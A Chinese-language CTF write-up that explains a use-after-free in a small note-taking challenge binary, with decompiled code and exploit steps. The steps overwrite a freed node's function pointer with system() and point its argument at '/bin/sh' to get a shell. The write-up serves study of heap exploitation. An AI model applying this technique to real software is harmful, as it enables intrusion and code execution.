**利用：UAF**
程序提供了三个操作：add node，delete node，print node .

add函数：
最多可以malloc三次。
```
unsigned int add()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+1Ch] [ebp-1Ch]
  int size; // [esp+20h] [ebp-18h]
  char buf; // [esp+24h] [ebp-14h]
  unsigned int v5; // [esp+2Ch] [ebp-Ch]
  if ( number <= 2 )
  {
    for ( i = 0; i <= 2; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);                    // 16 byte
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);                            
        }
        *(_DWORD *)ptr[i] = puts_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++number;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
    puts("Full");
}
```
add函数申请了两个chunk。
一个chunk用来存放node的信息：puts_content函数的地址，content_ptr.
另一个chunk用来存放content。
可用以下结构体表示：
```
struct info
{
   void (* fun_ptr)(void *)
   char*   content_ptr
}
--low addr--
info_chunk   16 byte
content_chunk
--hign addr--
```
delete函数：
free后没有将指针置为NULL，存在UAF。

程序中给出了后门函数：
```
int __cdecl sub_8048672(int a1)
{
  return system(*(const char **)(a1 + 4));
}
```
那么利用UAF，将某个node 的info chunk 中的函数指针修改为后门函数。
程序刚开始输入的name，输入/bin/sh，将info chunk中的content_ptr修改为&name，下次调用print函数时即可getshell。

具体利用过程为：
```
create(0x30,"a")#index0
create(0x30,"a")#index1
```
只要申请的content的chunk的size不是16byte即可。
```
delete(0)
delete(1)
```
再申请一个chunk,create(14,p32(system)+p32(&name))，拿到的content chunk即是index0的info chunk。

